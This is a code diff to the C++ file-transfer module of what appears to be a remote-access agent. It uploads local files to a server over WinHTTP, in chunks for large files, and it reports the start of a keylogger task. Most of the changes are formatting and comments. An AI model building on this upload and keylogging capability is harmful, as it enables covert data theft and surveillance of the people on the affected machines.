@@ -29,6 +29,8 @@ namespace FileTransfer
             std::size_t size,
             const std::string &fileName = {})
         {
+            // Use WinHTTP directly so both whole-file and chunked uploads share
+            // the same request and status-code handling.
             std::wstring wideUrl(url.begin(), url.end());
             URL_COMPONENTS components{};
             components.dwStructSize = sizeof(components);
@@ -42,21 +44,23 @@ namespace FileTransfer
                 return false;
 
             HINTERNET session = WinHttpOpen(L"Trinity Agent File Transfer",
-                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                             WINHTTP_NO_PROXY_NAME,
-                                             WINHTTP_NO_PROXY_BYPASS, 0);
+                                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                            WINHTTP_NO_PROXY_NAME,
+                                            WINHTTP_NO_PROXY_BYPASS, 0);
             if (!session)
                 return false;
             HINTERNET connection = WinHttpConnect(session, host, components.nPort, 0);
             HINTERNET request = connection
-                ? WinHttpOpenRequest(connection, L"POST", path, nullptr,
-                                     WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                     components.nScheme == INTERNET_SCHEME_HTTPS
-                                         ? WINHTTP_FLAG_SECURE : 0)
-                : nullptr;
+                                    ? WinHttpOpenRequest(connection, L"POST", path, nullptr,
+                                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                                         components.nScheme == INTERNET_SCHEME_HTTPS
+                                                             ? WINHTTP_FLAG_SECURE
+                                                             : 0)
+                                    : nullptr;
             if (!request)
             {
-                if (connection) WinHttpCloseHandle(connection);
+                if (connection)
+                    WinHttpCloseHandle(connection);
                 WinHttpCloseHandle(session);
                 return false;
             }
@@ -115,7 +119,8 @@ namespace FileTransfer
         const auto fileName =
             fs::path(filePath).filename().string();
 
-        // Small files are sent in one request.
+        // Keep small uploads simple; larger files use numbered chunks so the
+        // server can rebuild them without holding the entire file in memory.
         if (fileSize < 100LL * 1024 * 1024)
         {
             std::vector<char> data(
@@ -143,7 +148,6 @@ namespace FileTransfer
         }
         else
         {
-            // Large files are sent in chunks.
             std::vector<char> buffer(chunkSize);
 
             int chunkNumber = 0;
@@ -171,7 +175,7 @@ namespace FileTransfer
                 }
             }
 
-            // Tell the server to rebuild the uploaded chunks.
+            // Ask the server to validate the expected size while rebuilding.
             if (!PostBinary(
                     baseUrl + "/" + transferId + "/rebuild?expectedBytes=" +
                         std::to_string(fileSize) + "&taskId=" + std::to_string(taskId),
@@ -195,6 +199,7 @@ namespace FileTransfer
         if (!fs::exists(directory))
             return false;
 
+        // Lexicographic ordering is stable because chunk names are zero-padded.
         std::vector<fs::path> chunks;
 
         for (const auto &entry :
@@ -233,6 +238,8 @@ namespace FileTransfer
                 return false;
         }
 
+        // The caller owns the transfer directory and can remove it after a
+        // successful rebuild.
         return true;
     }
 
@@ -256,11 +263,6 @@ namespace FileTransfer
                     "Failed to post stream data"});
         }
 
-        return CreateTaskResponse(
-            std::stoi(streamId),
-            KEYLOGGER_START,
-            NO_CODE,
-            SUCCESS,
-            TaskSuccess{"true"});
+        return CreateTaskResponse(std::stoi(streamId), KEYLOGGER_START, NO_CODE, SUCCESS, TaskSuccess{"true"});
     }
 }
